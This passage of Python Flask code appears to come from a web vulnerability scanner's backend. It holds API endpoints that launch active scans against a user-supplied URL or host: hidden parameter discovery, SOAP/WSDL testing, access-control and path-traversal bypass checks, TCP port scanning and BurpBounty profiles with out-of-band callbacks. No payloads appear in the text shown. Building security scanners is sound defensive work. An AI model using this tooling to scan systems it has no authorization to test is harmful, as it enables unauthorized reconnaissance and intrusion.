        "fabric":          {"available": _FABRIC_AVAILABLE, "patterns": len(_FABRIC_DAST_PATTERNS)},
        "engine":          {
            "available": _ENGINE_AVAILABLE,
            "running":   eng_running,
            "status":    eng_status,
            "progress":  eng_progress,
        },
        "passive_scanner": {"available": _ENGINE_AVAILABLE, "findings": len(_passive_findings)},
        "forced_browse":   {"available": _ENGINE_AVAILABLE, "running": _browse_running,
                            "results": len(_browse_results),
                            "wordlist_size": _browse_wordlist_total,
                            "unit": "paths"},
        "oast":            {"available": _ENGINE_AVAILABLE},
        "openapi_import":  {"available": _ENGINE_AVAILABLE, "surfaces_loaded": len(_openapi_surfaces)},
        "ajax_spider":     {"available": _AJAX_SPIDER_AVAILABLE, "running": _ajax_running},
        "katana":          {"available": _KATANA_AVAILABLE},
        "httpx":           {"available": _HTTPX_AVAILABLE},
        "wayback":         {"available": True},   # always available (CDX API + requests fallback)
        "sitemap_seed":    {"available": True},   # always available (urllib.request)
        "graphql":         {"available": True},   # always available (introspection probe)
        "graphql_scanner": {"available": True, "running": _graphql_scan_running,
                            "findings": len(_graphql_scan_findings)},
        "ws_scanner":      {"available": True, "running": _ws_scan_running,
                            "findings": len(_ws_scan_findings)},
        "websocket":       {"available": _AJAX_SPIDER_AVAILABLE},  # Playwright required
        "session_refresh": {"available": _AJAX_SPIDER_AVAILABLE,    # Sprint 3.1
                            "configured": bool(_login_config.get("login_url"))},
        "smart_form_fill": {"available": _AJAX_SPIDER_AVAILABLE},   # Sprint 3.2
        "external_tools":  {"available": _HAS_EXTERNAL_TOOLS,
                            "tools": get_available_tools() if _HAS_EXTERNAL_TOOLS else {}},
        "assurance_layer": {
            "available": True,
            "checks": len(_ASSURANCE_REGISTRY.list_checks()),
            "coverage": _ASSURANCE_REGISTRY.gap_report(
                eng_progress.get("coverage_checks", [])
            ),
        },
    })


# ══════════════════════════════════════════════════════════════════════════════
# ██  PERSISTENT STORAGE ENDPOINTS  (FindingStore — Postgres/SQLite/Memory)
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/storage/trending")
@_login_required
def storage_trending():
    """Cross-scan vulnerability trend data (last 30 days by default)."""
    days = int(req.args.get("days", 30))
    try:
        trends = get_store().get_trending(days=days)
        return jsonify({"days": days, "trends": trends, "count": len(trends)})
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500


@app.route("/api/storage/scans")
@_login_required
def storage_list_scans():
    """List recent scans with metadata."""
    limit = int(req.args.get("limit", 50))
    try:
        scans = get_store().list_scans(limit=limit)
        return jsonify({"scans": scans, "count": len(scans),
                        "backend": get_store().backend_name})
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500


@app.route("/api/storage/fp")
@_login_required
def storage_list_fp():
    """List all findings marked as false positives."""
    try:
        fps = get_store().list_false_positives()
        return jsonify({"false_positives": fps, "count": len(fps)})
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500


@app.route("/api/storage/fp/<finding_id>", methods=["POST"])
@_login_required
def storage_mark_fp(finding_id: str):
    """Mark a finding as a false positive. Excludes it from future exports."""
    try:
        success = get_store().mark_false_positive(finding_id)
        if success:
            _db.mark_false_positive(finding_id)
            _db.log_audit("finding_fp_marked", scan_id=_active_scan_id,
                          actor=session.get("user", "anonymous"), ip=req.remote_addr,
                          detail=f"finding={finding_id}")
        return jsonify({"success": success, "finding_id": finding_id})
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500


@app.route("/api/storage/info")
@_login_required
def storage_info():
    """Return storage backend info and current scan id."""
    store = get_store()
    return jsonify({
        "backend":        store.backend_name,
        "active_scan_id": _active_scan_id,
    })


# ── ZAP Add-on parity: Param Digger ──────────────────────────────────────────

_param_digger_results: list[dict] = []
_param_digger_running = False

@app.route("/api/engine/param-digger/scan", methods=["POST"])
@_login_required
def param_digger_scan():
    """Start hidden parameter discovery on a URL."""
    global _param_digger_results, _param_digger_running
    data = request.get_json(silent=True) or {}
    target_url = data.get("url", "").strip()
    if not target_url:
        return jsonify({"error": "url required"}), 400
    methods = data.get("methods", ["url", "body"])
    delay = float(data.get("delay", 0.1))
    _param_digger_results = []
    _param_digger_running = True
    import threading as _threading
    def _run():
        global _param_digger_results, _param_digger_running
        try:
            import requests as _req
            sess = _req.Session()
            digger = ParamDigger(delay=delay)
            results = digger.run(sess, target_url, methods=methods)
            _param_digger_results = [r.to_dict() for r in results]
        except Exception as exc:
            _param_digger_results = [{"error": str(exc)}]
        finally:
            _param_digger_running = False
    _threading.Thread(target=_run, daemon=True).start()
    return jsonify({"status": "started", "url": target_url})

@app.route("/api/engine/param-digger/status")
@_login_required
def param_digger_status():
    return jsonify({"running": _param_digger_running, "found": len(_param_digger_results)})

@app.route("/api/engine/param-digger/results")
@_login_required
def param_digger_results():
    return jsonify({"results": _param_digger_results, "total": len(_param_digger_results)})


# ── ZAP Add-on parity: SOAP Scanner ──────────────────────────────────────────

_soap_findings: list[dict] = []
_soap_running = False

@app.route("/api/engine/soap/scan", methods=["POST"])
@_login_required
def soap_scan():
    """Active SOAP/WSDL vulnerability scan."""
    global _soap_findings, _soap_running
    data = request.get_json(silent=True) or {}
    wsdl_url = data.get("wsdl_url", "").strip()
    if not wsdl_url:
        return jsonify({"error": "wsdl_url required"}), 400
    _soap_findings = []
    _soap_running = True
    import threading as _threading
    def _run():
        global _soap_findings, _soap_running
        try:
            import requests as _req
            sess = _req.Session()
            scanner = SOAPScanner()
            findings = scanner.scan(sess, wsdl_url)
            _soap_findings = [f.to_dict() for f in findings]
        except Exception as exc:
            _soap_findings = [{"error": str(exc)}]
        finally:
            _soap_running = False
    _threading.Thread(target=_run, daemon=True).start()
    return jsonify({"status": "started", "wsdl_url": wsdl_url})

@app.route("/api/engine/soap/status")
@_login_required
def soap_status():
    return jsonify({"running": _soap_running, "findings": len(_soap_findings)})

@app.route("/api/engine/soap/results")
@_login_required
def soap_results():
    return jsonify({"findings": _soap_findings, "total": len(_soap_findings)})


# ── ZAP Add-on parity: Access Control Testing ────────────────────────────────

_access_control_findings: list[dict] = []
_access_control_running = False

@app.route("/api/engine/access-control/scan", methods=["POST"])
@_login_required
def access_control_scan():
    """Access control matrix testing."""
    global _access_control_findings, _access_control_running
    data = request.get_json(silent=True) or {}
    urls = data.get("urls", [])  # list of {"url": "...", "method": "GET"}
    if not urls:
        return jsonify({"error": "urls list required"}), 400
    _access_control_findings = []
    _access_control_running = True
    import threading as _threading
    def _run():
        global _access_control_findings, _access_control_running
        try:
            import requests as _req
            tester = AccessControlTester()
            findings = []
            for entry in urls[:50]:
                u = entry.get("url", "")
                m = entry.get("method", "GET")
                if u:
                    findings += tester.test_unauthenticated_access(u, m)
                    findings += tester.test_http_verb_tampering(None, u)
                    findings += tester.test_path_traversal_bypass(None, u)
            _access_control_findings = [f.to_dict() for f in findings]
        except Exception as exc:
            _access_control_findings = [{"error": str(exc)}]
        finally:
            _access_control_running = False
    _threading.Thread(target=_run, daemon=True).start()
    return jsonify({"status": "started", "url_count": len(urls)})

@app.route("/api/engine/access-control/results")
@_login_required
def access_control_results():
    return jsonify({"findings": _access_control_findings, "running": _access_control_running,
                    "total": len(_access_control_findings)})


# ── ZAP Add-on parity: Port Scanner ──────────────────────────────────────────

_port_scan_results: list[dict] = []
_port_scan_findings: list[dict] = []
_port_scan_running = False

@app.route("/api/engine/port-scan", methods=["POST"])
@_login_required
def port_scan():
    """TCP port discovery scan."""
    global _port_scan_results, _port_scan_findings, _port_scan_running
    data = request.get_json(silent=True) or {}
    host = data.get("host", "").strip()
    if not host:
        return jsonify({"error": "host required"}), 400
    ports = data.get("ports", None)  # None = use TOP_100_PORTS
    _port_scan_results = []
    _port_scan_findings = []
    _port_scan_running = True
    import threading as _threading
    def _run():
        global _port_scan_results, _port_scan_findings, _port_scan_running
        try:
            scanner = PortScanner()
            results, findings = scanner.scan(host, ports)
            _port_scan_results = [r.to_dict() for r in results if r.state == "open"]
            _port_scan_findings = [f.to_dict() for f in findings]
        except Exception as exc:
            _port_scan_findings = [{"error": str(exc)}]
        finally:
            _port_scan_running = False
    _threading.Thread(target=_run, daemon=True).start()
    return jsonify({"status": "started", "host": host})

@app.route("/api/engine/port-scan/results")
@_login_required
def port_scan_results_endpoint():
    return jsonify({"open_ports": _port_scan_results, "findings": _port_scan_findings,
                    "running": _port_scan_running})


# ── ZAP Add-on parity: Postman Importer ──────────────────────────────────────

@app.route("/api/import/postman", methods=["POST"])
@_login_required
def import_postman():
    """Import a Postman Collection JSON and return parsed requests."""
    data = request.get_json(silent=True) or {}
    collection = data.get("collection")  # dict (already parsed JSON)
    env = data.get("environment", {})
    if not collection:
        return jsonify({"error": "collection JSON object required"}), 400
    try:
        importer = PostmanImporter()
        reqs = importer.load_collection(collection, env=env)
        return jsonify({
            "requests": [r.to_dict() for r in reqs],
            "total": len(reqs),
        })
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500


# ── BurpBounty Profile Engine ─────────────────────────────────────────────────

_bb_engine = None
_bb_results: list = []
_bb_running: bool = False


def _get_bb_engine():
    global _bb_engine
    if _bb_engine is None:
        _bb_engine = BurpBountyEngine()
    return _bb_engine


@app.route("/api/engine/burp-bounty/scan", methods=["POST"])
@_login_required
def burp_bounty_scan():
    """Run BurpBounty active profiles against a target URL."""
    global _bb_results, _bb_running
    data = request.get_json(silent=True) or {}
    url = data.get("url", "").strip()
    if not url:
        return jsonify({"error": "url required"}), 400
    tags_filter = data.get("tags", None)
    oast_url = data.get("oast_url", "")
    if not oast_url:
        try:
            oast_url = get_or_start_oast().http_url or ""
        except Exception:
            oast_url = ""

    _bb_results = []
    _bb_running = True

    import threading as _threading
    import requests as _req

    def _run():
        global _bb_results, _bb_running
        try:
            engine = _get_bb_engine()
            sess = _req.Session()
            findings = engine.run_active(sess, url, tags_filter=tags_filter, oast_url=oast_url)
            _bb_results = [f.to_dict() for f in findings]
        except Exception as exc:
            _bb_results = [{"error": str(exc)}]
        finally:
            _bb_running = False

    _threading.Thread(target=_run, daemon=True).start()
    engine = _get_bb_engine()
    return jsonify({"status": "started", "url": url, "profiles_loaded": len(engine.profiles)})


@app.route("/api/engine/burp-bounty/status")
@_login_required
def burp_bounty_status():
    engine = _get_bb_engine()
    return jsonify({"running": _bb_running, "found": len(_bb_results),
                    "profiles_loaded": len(engine.profiles)})


@app.route("/api/engine/burp-bounty/results")
@_login_required
def burp_bounty_results():
    return jsonify({"results": _bb_results, "total": len(_bb_results), "running": _bb_running})


@app.route("/api/engine/burp-bounty/profiles")
@_login_required
def burp_bounty_profiles():
    engine = _get_bb_engine()
    return jsonify({"profiles": engine.list_profiles(), "total": len(engine.profiles)})
